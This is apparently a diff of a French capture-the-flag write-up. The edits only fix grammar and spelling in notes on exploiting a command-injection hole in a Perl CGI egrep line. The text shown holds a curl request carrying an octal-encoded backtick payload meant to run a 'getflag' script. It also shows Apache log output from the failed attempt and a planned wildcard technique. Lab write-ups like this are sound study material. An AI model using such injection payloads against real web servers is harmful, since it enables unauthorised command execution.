@@ -46,16 +46,16 @@ n(t(param("x"), param("y")));
 
 Toujours un exploit subshell à cette ligne : ```@output = `egrep "^$xx" /tmp/xd 2>&1`; ```
 
-Mais `$xx` est mise en majuscule puis tronquée au premier espace: 
+Mais `$xx` est mis en majuscule puis tronqué au premier espace: 
 
 
-Premier essaie est de passé une string en octal pour éviter les mofifications
+Le premier essai consiste à passer une string en octal pour éviter les mofifications
 
 `echo "getflag >/tmp/exploit" > /tmp/1`
 ```
 `curl 192.168.0.15:4646\?x="\`\$'\057\164\155\160\057\061'\`"
 ```
-Il se passe pas grand chose, on a acces aux logs
+Il ne se passe pas grand chose, on a accès aux logs
 ``` 
 tail -f /var/log/apache2/error.log
 
@@ -63,7 +63,7 @@ tail -f /var/log/apache2/error.log
 [error] [client 192.168.0.18] $\\057\\164\\155\\160\\057\\061: not found
 ```
 
-Arf le subshell invoqué est `sh`et ne peut pas expand une string octale :((( solution en attente....
+Arf! le subshell invoqué est `sh`et ne peut pas expand une string octale :((( solution en attente....
 
 Deuxieme technique, on rename le fichier /tmp/1 en /tmp/1111 et on va utiliser un Wildcard pour trouver notre script sans utiliser de lettre : 
 
